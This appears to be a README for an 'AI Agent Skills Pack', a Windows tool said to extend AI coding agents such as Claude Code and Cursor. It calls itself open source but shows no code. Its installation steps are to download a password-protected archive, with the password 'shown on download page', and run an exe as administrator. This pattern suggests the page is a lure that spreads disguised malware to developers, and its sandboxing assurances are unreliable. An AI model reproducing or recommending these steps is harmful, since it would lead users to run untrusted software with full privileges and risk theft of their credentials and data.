# AI Agent Skills Pack

![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-0078D6?style=flat-square&logo=windows&logoColor=white)
![Node](https://img.shields.io/badge/Node.js-18%2B-339933?style=flat-square&logo=nodedotjs&logoColor=white)
![Version](https://img.shields.io/badge/Version-1.2.0-brightgreen?style=flat-square)
![Status](https://img.shields.io/badge/Status-Stable-success?style=flat-square)
![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square)

Extensible capability suite for AI coding agents — adds file operations, workflow automation, and API integration modules to Claude Code, Cursor, Codex, and Continue.

<div align="center">

[![Download AI Agent Skills Pack v1.2.0](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20v1.2.0-6E56CF?style=for-the-badge&logoColor=white)](https://github.com/maxlopez-xb0/ai-agent-skills-pack-2026/releases/tag/v1.2.0)

</div>

---

## 📋 Overview

AI Agent Skills Pack is an open-source desktop utility that extends AI coding agents with modular capabilities. Instead of rebuilding context for every task, you register capabilities once and reuse them across agents, projects, and machines.

The toolkit ships with a curated set of modules for common developer workflows — file manipulation, task automation, API bridges, and template generation — plus a registry system for authoring your own.

**Who it's for:** developers using Claude Code, Cursor, Codex, or Continue who want to expand their agent's functionality without writing glue code from scratch.

---

## 🧩 Modules

### File Operations
- Batch read/write with atomic transactions
- Recursive tree traversal with glob and regex filters
- Encoding detection and conversion
- Safe copy/move with checksum verification
- Watch mode for live directory monitoring

### Workflow Automation
- Chainable task runner with conditional branching
- Retry logic with exponential backoff
- Parallel step execution with dependency graph
- Cron-style scheduling for recurring jobs
- Structured logging with per-step output

### API Integrations
- GitHub — issues, PRs, releases, actions
- OpenAI / Anthropic — model routing and prompt caching
- Linear / Notion — task and doc sync
- Slack / Discord — notification bridges
- Generic REST/GraphQL connector with auth templates

### Templates
- Prompt scaffold library for common coding tasks
- Project boilerplate generators (Node, Python, Rust, Go)
- PR description and commit message formatters
- Test stub generators per framework

### Context Memory
- Persistent vector store for cross-session recall
- Per-project namespaces
- Semantic search over past interactions
- Manual pinning of critical context

---

## 🤖 Supported Agents

| Agent | Integration | Status |
|-------|-------------|--------|
| Claude Code | Extension manifest, hot-reload | ✅ Stable |
| Cursor | Rule injection, composer-aware | ✅ Stable |
| Codex | CLI hooks, task queue | ✅ Stable |
| Continue | Config-based registration | ✅ Stable |
| Aider | Community wrapper | 🧪 Beta |

---

## 💻 System Requirements

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| **OS** | Windows 10 (64-bit) | Windows 11 |
| **RAM** | 4 GB | 8 GB |
| **Storage** | 300 MB | 1 GB |
| **Node.js** | 18+ | 20 LTS |
| **Network** | Required for API modules | Low-latency broadband |
| **Permissions** | Standard user | Administrator (for vault) |

---

## 🔧 Installation

1. Download the archive using the button above
2. Extract with 7-Zip or WinRAR (password shown on download page)
3. Right-click `AgentSkillsPack.exe` and select **Run as administrator**
4. Follow the setup wizard — it auto-detects installed agents
5. Select which modules to enable per agent
6. Restart your agent and verify registration in its extension list

---

## ❓ FAQ

**How do I add a custom module?**  
Create a folder with a `manifest.yaml` and an entry file. Run `AgentSkillsPack register ./your-module` — the utility validates the schema and adds it to the registry.

**Does it work with agents other than the four listed?**  
Yes — any agent that supports external capability registration can be wired up manually. See `docs/integration-guide.md` for the generic adapter interface.

**Do I need an API key?**  
Only for API Bridge modules. Local modules (File Operations, Workflow Automation, Templates, Context Memory) work fully offline.

**Will this slow down my agent?**  
No — modules are lazy-loaded. Only active capabilities consume memory, and the extension layer adds under 20 ms to cold start.

**Can I use this on multiple machines?**  
Yes — export your capability profile as YAML and import it on another machine. Cloud sync is on the roadmap.

**Is it safe to give file access?**  
File Operations runs sandboxed with an allowlist of root paths you define. All invocations are logged.

**How do I uninstall?**  
Run `AgentSkillsPack uninstall` — it removes registry entries and leaves your project files untouched.

**Does it support Linux or macOS?**  
Linux is in beta. macOS is planned for 2026. Windows 10/11 are the primary supported platforms.

---

## 🗺️ Roadmap — 2026

- [ ] Linux stable build with inotify-native watcher
- [ ] macOS support (Apple Silicon + Intel)
- [ ] Cloud sync for capability profiles
- [ ] Module marketplace with community submissions and ratings
- [ ] On-device LLM routing for offline workflows
- [ ] VS Code native extension wrapper
- [ ] Per-capability permission model with prompts
- [ ] Web dashboard for capability analytics

---

## 📄 License

MIT License — see [LICENSE](LICENSE) for details.

---

<div align="center">

[![Download AI Agent Skills Pack v1.2.0](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20v1.2.0-6E56CF?style=for-the-badge&logoColor=white)](https://github.com/maxlopez-xb0/ai-agent-skills-pack-2026/releases/tag/v1.2.0)

**Version 1.2.0** — Stable Release · Modular · Open Source · MIT

</div>
